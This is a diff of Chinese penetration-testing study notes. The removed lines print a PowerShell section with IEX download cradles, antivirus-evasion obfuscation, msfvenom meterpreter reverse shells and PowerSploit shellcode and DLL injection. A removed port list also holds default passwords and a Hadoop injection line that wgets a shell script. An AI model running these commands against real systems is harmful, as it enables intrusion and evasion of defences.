@@ -5,11 +5,9 @@
 
 - [写在前面](#写在前面)
 - [准备工作](#准备工作)
-  - [选修：提升渗透能力](#选修提升渗透能力)
-    - [powershell](#powershell)
-  - [系统配置](#系统配置)
+  - [虚拟机系统配置](#虚拟机系统配置)
     - [配置上网](#配置上网)
-  - [入场券：基本常见知识点](#入场券基本常见知识点)
+  - [基本常见知识点](#基本常见知识点)
     - [编码](#编码)
       - [URL编码](#url编码)
       - [Base64](#base64)
@@ -25,14 +23,7 @@
     - [请求协议](#请求协议)
     - [端口](#端口)
       - [常见端口](#常见端口)
-        - [重点数据库端口](#重点数据库端口)
-    - [隧道](#隧道)
-    - [DOCKER](#docker)
     - [蜜罐](#蜜罐)
-    - [虚拟化的知识](#虚拟化的知识)
-    - [MVC框架](#mvc框架)
-    - [防火墙原理](#防火墙原理)
-    - [网络基础](#网络基础)
       - [OSI七层协议](#osi七层协议)
       - [UDP](#udp)
       - [TCP](#tcp)
@@ -140,7 +131,6 @@
       - [电子邮件](#电子邮件)
       - [theHarvester](#theharvester)
       - [sparta](#sparta)
-  - [蓝方设备](#蓝方设备)
     - [帮助手动测试](#帮助手动测试)
       - [hackbar](#hackbar)
       - [nmap](#nmap)
@@ -461,264 +451,16 @@
 
 
 
-## 选修：提升渗透能力
-
-### powershell
-
-早就听闻powershell是一个功能强大的shell，如同linux的bash，并且支持.NET，全凭命令操作windows服务。现被更广泛用于渗透测试等方面，在不需要写入磁盘的情况下执行命令，也可以逃避Anti-Virus检测。
-
-语法
-
-> | 管道符的作用是将一个命令的输出作为另一个命令的输入
-> ; 分号用来连续执行系统命令
-> ＆是调用操作符，它允许你执行命令，脚本或函数
-> 双引号可以替换内部变量
-> 双引号里的双引号，单引号里的单引号，写两遍输出
-
-常用命令
-    使用powershell满足一个标椎动词-名词组合，来帮助我们更快理解。
-
-    Get-Alias -name dir 查看别名
-    
-    Ls env 查看当前环境变量
-    
-    Get-ExecutionPolicy 查看当前执行策略
-    
-    Set-ExecutionPolicy 设置执行的策略
-    
-    Get-Host 查看powershell版本
-    
-    Get-Content 查看文件内容
-    
-    Get-Content test.txt  显示文本内容
-    
-    Set-Content test.txt-Value "hello,word" 设置文本内容
-    
-    Get-Process  查看当前服务列表
-    
-    Get-Location 获取当前位置
-    
-    Get-WmiObject -Class Win32_ComputerSystem |Select-object -ExpandProperty UserName 查看登录到物理机的用户
-
-执行策略
-    powershell有六种执行策略：
-
-    Unrestricted  权限最高，可以不受限制执行任意脚本
-    
-    Restricted  默认策略，不允许任意脚本的执行
-    
-    AllSigned  所有脚本必须经过签名运行
-    
-    RemoteSigned  本地脚本无限制，但是对来自网络的脚本必须经过签名
-    
-    Bypass   没有任何限制和提示
-    
-    Undefined  没有设置脚本的策略
-    
-    默认情况下，禁止脚本执行。除非管理员更改执行策略。Set-ExecutionPolicy
-
-绕过执行策略执行大概有以下几种：
-
-1.本地读取然后通过管道符运行
-
-        powershell Get-Content 1.ps1 | powershell -NoProfile -    
-
-2.远程下载并通过IEX运行脚本
-
-        powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx/a.ps1')"    
-
-3.Bypass执行策略绕过
-
-        powershell -ExecutionPolicy bypass -File ./a.ps1    
-
-不会显示警告和提示
-
-4.Unrestricted执行策略标志
-
-        powershell -ExecutionPolicy unrestricted -File ./a.ps1    
-
-当运行一个从网上下载的未签名的脚本时，会给出权限提示
-
-需要解释的是：
-
-    Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。
-    
-    WindowStyle Hidden（-w Hidden）：隐藏窗口
-    
-    Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。
-    
-    NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
-    
-    Noexit（-Noe）：执行后不退出Shell。
-    
-    EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题
-
-bypass Anti-Virus
-如果考虑实际情况，假设我们获取了一个webshell。以上的几种方法只有IEX可以远程加载直接运行，其余都需要上传ps木马再绕过执行策略。
-
-msfvenom生成ps木马
-
-        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.203.140 LPORT=4444 -f psh-reflection >a.ps1    
-
-但是一些Anti-Virus对powershell命令查杀比较严格。以360为例：
-
-对于后一种，可以将绕过执行策略的命令修改为bat文件后再次运行。可绕过360
-
-        powershell -ExecutionPolicy bypass -File ./a.ps1    
-
-将该命令保存为c.bat，菜刀运行即可。
-
-
-
-对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。
-
-主要是对DownloadString、http做一些处理。
-
-比如这个：
-
-        powershell.exe     
-    
-        "    
-    
-        $c1='powershell -c IEX';    
-    
-        $c2='(New-Object Net.WebClient).Downlo';    
-    
-        $c3='adString(''http://192.168.197.192/a.ps1'')';    
-    
-        echo ($c1,$c2,$c3)    
-    
-        "    
-
-先将命令拆分为字符串，然后进行拼接。
-
-需要注意的是双引号可以输出变量，两个单引号连用才能输出一个单引号。
-
-
-
-成功输出该命令。echo修改为IEX即可运行，bypass 360。
-
-
-
-也可以使用replace替换函数，bypass。
-
-        powershell "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.197.192/a.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"    
-
-也可以对http字符进行绕过，同样可以bypass
-
-        powershell "$a='IEX((new-object net.webclient).downloadstring(''ht';$b='tp://192.168.197.192/a.ps1''))';IEX ($a+$b)"     
-
-
-
-实际测试也可以在菜刀里直接运行后产生session
-
-为了更好用于实战，可以在c、vbs、hta、python等语言中执行该系统命令，达到bypass的效果。
-
-大佬们还写出了用于编码和混淆的框架
-
-    https://github.com/danielbohannon/Invoke-Obfuscation
-    
-    https://www.freebuf.com/sectool/136328.html
-
-还有一款通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。
-
-    参考资料：https://github.com/peewpw/Invoke-PSImage
-
-在利用的时候需要准备一张足够大的图片。我用的是1900*1200的图片x.jpg。
-
-        C:\>powershell    
-    
-        PS C:\> Import-Module .\Invoke-PSImage.ps1    
-    
-        PS C:\> Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web    
-
-a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。
-
-
-
-并将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。
-
-
-
-加载shellcode、dll、exe
-在《web安全攻防》书里有利用 PowerSploit 脚本加载shellcode、dll反弹meterpreter shell的方法。我把之前的笔记放在这里。
-
-1.加载shellcode
-
-msfvenom生成脚本木马
-
-        msfvenom -p windows/x64/meterpreter/reverse_httf18ps LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test     
-
-在windows靶机上运行一下命令
-
-        IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")    
-    
-        IEX(New-Object Net.WebClient).DownloadString("http://192.168.72.164/test")    
-    
-        Invoke-Shellcode -Shellcode ($buf) -Force  运行木马    
-
-使用Invoke-Shellcode.ps1脚本执行shellcode
-
-即可反弹meterpreter shell
-
-
-
-2.加载dll
-
-使用msfvenom 生成dll木马脚本
-
-        msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll    
-
-将生成的dll上传到目标的C盘。在靶机上执行以下命令
-
-        IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")    
-    
-        Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden     
-
-创建新的进程启动记事本，并设置为隐藏
-
-        Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID     
-
-使用Invoke-DLLinjection脚本，启动新的进程进行dll注入(没有杀毒软件)
-
-
-
-即可反弹meterpreter session
-
-3.加载exe
-
-msfvenom生成exe木马（不免杀）
-
-        msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.197.195 lport=4444 -f exe > /var/www/html/test.exe     
-
-还是powersploit的Invoke-ReflectivePEInjection.ps1脚本，可以直接远程加载exe达到bypass
-
-        powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.197.195/test.exe   -ForceASLR"     
-
-成功反弹meterpreter shell
-
-
-
-该脚本也可以结合之前的bypass方式进行免杀提权。
-
-其余参考资料
-
-    15-ways-bypass-powershell-exec
-    
-    Powershell-Basic-learning
-
-
-## 系统配置
+## 虚拟机系统配置
 
 ### 配置上网
 
-**kali网络配置**
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515003648812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
-## 入场券：基本常见知识点
+## 基本常见知识点
 
 ### 编码
 
@@ -993,264 +735,15 @@ MongoDB，NoSQL数据库；攻击方法与其他数据库类似
 >（1）爆破：弱口令
 >（2）未授权访问；（http://www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/1915
 
-##### 重点数据库端口
-
-常见端口
 
 
-21 ftp        
-69 TFTP       (简单文件传输协议) 
-22 SSH 
-
-80 web
-80-89 web
-443 https   SSL心脏滴血
-
-873 Rsync未授权
-
-   这玩应记不住？记不住？
-3306 MySQL
-3389 远程桌面
-5432 PostgreSQL
-5900 vnc   目前常用的协议有VNC/SPICE/RDP三种 、小巧，支持客户端和服务器端的直接拷贝粘贴，缺点：速度最慢
-6379 redis未授权
-7001,7002 WebLogic默认弱口令，反序列
-8080 tomcat/WDCP主机管理系统，默认弱口令
-8080,8089,9090 JBOSS
-Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，
-		默认端口是8080
-		在windows系统中：
- 	1098、1099、4444、4445、8083端口在/jboss/server/default/conf/jboss-service.xml中
- 	8080端口在/jboss/server/default/deploy/jboss-web.deployer/server.xml中
- 	8093端口在/jboss/server/default/deploy/jms/uil2-service.xml中。
-8000-9090 都是一些常见的web端口
-27017,27018 Mongodb未授权访问
-28017 mongodb统计页面
-50070,50030 hadoop默认端口未授权访问
-
-161 SNMP
-389 LDAP
-512,513,514 Rexec
-1025,111 NFS
-2082/2083 cpanel主机管理系统登陆 （国外用较多）
-2222 DA虚拟主机管理系统登陆 （国外用较多）
-2601,2604 zebra路由，默认密码zebra
-3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了
-3312/3311 kangle主机管理系统登陆
-4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网
-5984 CouchDB http://xxx:5984/_utils/
-6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网
-7778 Kloxo主机控制面板登录
-8083 Vestacp主机管理系统 （国外用较多）
-8649 ganglia
-8888 amh/LuManager 主机管理系统默认端口
-9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞
-10000 Virtualmin/Webmin 服务器虚拟主机管理系统
-11211 memcache未授权访问
-50000 SAP命令执行
-部分参考csdn一位师傅的，自己整理一些
-
-
-公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；
-注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；
-动态/私有：49152-65535，不为服务分配这些端口；
-
-（1）TCP端口
-
-TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。
-
-（2）UDP端口
-
-UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口，QQ使用的8000和4000端口等等。
-
-21 FTP
-
->匿名/暴力破解
->拒绝服务
-
-22 SSH
-
->暴力破解
-
-23 Telent
-
->弱口令 / 暴力破解
->Winbox(CVE-2018-14847)
->https://github.com/BasuCert/WinboxPoC
-
-80 HTTP
-
-443 https
-
-3389 SMB
-
-8080 Tomcat
-快速扫描：
-Masscan -p80,800 ip --rate=10000
-21 / FTP
-
-22 / SSH
-
-23 / telnet
-
-
-161 / snmp
-弱口令
-https://blog.csdn.net/archersaber39/article/details/78932252
-389 / ladp
-匿名访问
-https://www.cnblogs.com/persuit/p/5706432.html
-ladp注入
-http://www.4hou.com/technology/9090.html
-https://www.freebuf.com/articles/web/149059.html
-443 / ssl
-openssl心脏出血
-https://paper.seebug.org/437/
-http://www.anquan.us/static/drops/papers-1381.html
-https://www.freebuf.com/sectool/33191.html
-445 / smb
-win10拒绝服务
-永恒之蓝RCE
-875 / rsync
-匿名访问
-http://www.anquan.us/static/bugs/wooyun-2016-0190815.html
-https://paper.seebug.org/409/
-http://www.91ri.org/11093.html
-1433 / mssql
-暴力破解
-http://www.anquan.us/static/drops/tips-12749.　　html
-https://www.seebug.org/appdir/Microsoft%20SQL%20Server
-1521 / oracle
-暴力破解
-https://www.exploit-db.com/exploits/33084
-2601 / zebra
-http://www.anquan.us/static/bugs/wooyun-2013-047409.html
-3128 / squid
-3306 / mysql
-RCE
-http://www.91ri.org/17511.html
-CVE-2015-0411
-hash破解
-https://www.freebuf.com/column/153561.html
-waf绕过
-https://www.freebuf.com/articles/web/155570.html
-general_log_file getshell
-https://www.freebuf.com/column/143125.html
-提权
-http://www.91ri.org/16540.html
-3312 / kangle
-getshell
-https://www.secpulse.com/archives/23927.html
-3389 / rdp
-shift 放大镜 输入法绕过 guest用户
-永恒之蓝(ESTEEMAUDIT)
-https://www.freebuf.com/articles/system/132171.html
-https://www.anquanke.com/post/id/86328
-ms12-020
-https://blog.csdn.net/meyo_leo/article/details/77950552
-4440 / rundeck
-https://www.secpulse.com/archives/29500.html
-4848 / glassfish
-文件读取
-https://www.secpulse.com/archives/42277.html
-https://www.anquanke.com/post/id/85948
-GlassFish2 / admin:admin GlassFish3,4 / 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误
-5432 / PostgreSQL
-RCE
-https://www.cnblogs.com/KevinGeorge/p/8521496.html
-https://www.secpulse.com/archives/69153.html
-默认账号postgres
-参考
-http://www.91ri.org/13070.html
-http://www.91ri.org/6507.html
-5672,15672,4369,25672 / RabbitMQ
-（guest/guest）
-5900 / VNC
-https://www.seebug.org/appdir/RealVNC
-5984 / CouchDB
-http://xxx:5984/_utils/
-6082 / varnish
-CLI 未授权
-https://www.secpulse.com/archives/10681.html
-6379 / redis
-Redis未授权
-ssh publickey
-crontab
-webshell
-反序列化
-开机自启文件夹写bat
-参考
-https://www.freebuf.com/column/170710.html
-7001,7002 / WebLogic
-默认弱口令
-weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic
-反序列
-CVE-2018-2628
-https://www.freebuf.com/articles/web/169770.html
-https://www.seebug.org/appdir/WebLogic
-9200,9300 / elasticsearch
-CVE-2015-1427
-http://www.anquan.us/static/drops/papers-5142.html
-CVE-2018-17246
-https://www.seebug.org/vuldb/ssvid-97730
-参考
-https://www.seebug.org/search/?keywords=elasticsearch
-9000 / fcgi
-https://paper.seebug.org/289/
-9043 / WebSphere
-Websphere8.5
-https://localhost:9043/ibm/console/logon.jsp
-Websphere6-7
-http://localhost:9043/ibm/console
-后台未授权，登录后可部署WAR包
-SOAP服务有反序列化
-弱口令：admin / password
-11211 / memcache
-未授权
-UDP反射
-https://shockerli.net/post/memcached-udp-reflection-attack-bug/
-27017,27018 / Mongodb
-未授权
-注入
-https://www.anquanke.com/post/id/83763
-phpMoAdmin RCE
-https://www.aqniu.com/threat-alert/6978.html
-50000 / SAP
-SAP命令执行
-https://www.secpulse.com/archives/20204.html
-50070,50030 / hadoop
-未授权
-https://www.freebuf.com/vuls/173638.html
-命令执行
-host:50060/pstack?pid=123|wget http://somehost/shell.sh
-https://www.seebug.org/search/?keywords=hadoop
-其他
-http://www.91ri.org/15441.html
-
-### 隧道
-
-隧道，就是一种绕过端口屏蔽的通信方式
-
-### DOCKER
-
-Docker 安全性问题
 
 ### 蜜罐
 
 蜜罐成了今年的重头反制武器，攻击方小心翼翼，清空浏览器缓存、不敢用自己电脑。防守方也因为蜜罐的部署解决了往年被疯狂扫描的想象，由被动变为主动。蜜罐溯源反制终将成为一个常态化趋势~~~
 
-### 虚拟化的知识
-
-### MVC框架
-
-### 防火墙原理
-
-简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。
 
 
-
-
-### 网络基础
 
 #### OSI七层协议
 
@@ -1474,14 +967,8 @@ HTTP 30X 响应码的安全问题
 
 
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506212445141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506213016305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506213102967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
 HTTPS多了SSL层，但一般而言这对于黑客而言于事无补。因为我们仍旧可以通过替换、伪造SSL证书或SSL剥离达到中间人攻击目的。
 
-
-http都是明文传输，代表比如账号密码都是可以抓取到的。https抓取账号密码要更困难一些。
 小网站通常买不起SSL证书，所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050621322069.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -1730,8 +1217,7 @@ SQL。通常指数据以对象的形式存储在数据库中，而对象之间�
 
 ### windows
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210624140124857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062414024872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 
 #### windows 不同系统
 
@@ -1943,7 +1429,6 @@ whatweb  http://whatweb.bugscaner.com/look/
 **CDN**
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512005207488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-**查询网站服务器**
 
 **网站使用说明书**
 
@@ -2126,7 +1611,7 @@ php 探针
 拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
 **dirbuster**
 kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）
-**Wvs**
+
 
 
 **IP收集**
@@ -2581,7 +2066,6 @@ python3 sparta.py
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-## 蓝方设备
 
 ### 帮助手动测试
 
@@ -2590,10 +2074,6 @@ python3 sparta.py
 **安装**
 可以被安装在浏览器上，也可以被安装在burp上
 测试SQL注入,XSS漏洞和网站的安全性[谷歌火狐安装链接破解，亲测可用](https://www.cnblogs.com/rab3it/p/11010446.html)
-无论是专业版还是社区版，您可能都不会在 bApp 商店中找到这个很棒的插件。那么，你将如何设置呢？ 为了让这个 Hackbar 成为我们渗透测试之旅的一部分，我们需要从GitHub    https://github.com/d3vilbug/HackBar存储库下载它的jar 文件。
-在burpsuite安装
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604010826149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-让我们检查一下，它是否有效！！
 
 跟踪中继器选项卡并右键单击屏幕上的任意位置。结束后，我们可以看到一个新选项排列为“Hackbar”。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604011001878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2602,7 +2082,7 @@ python3 sparta.py
 
 #### nmap
 
-有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 <numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。
+有时候你希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 <numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。
 
 **安装**
 
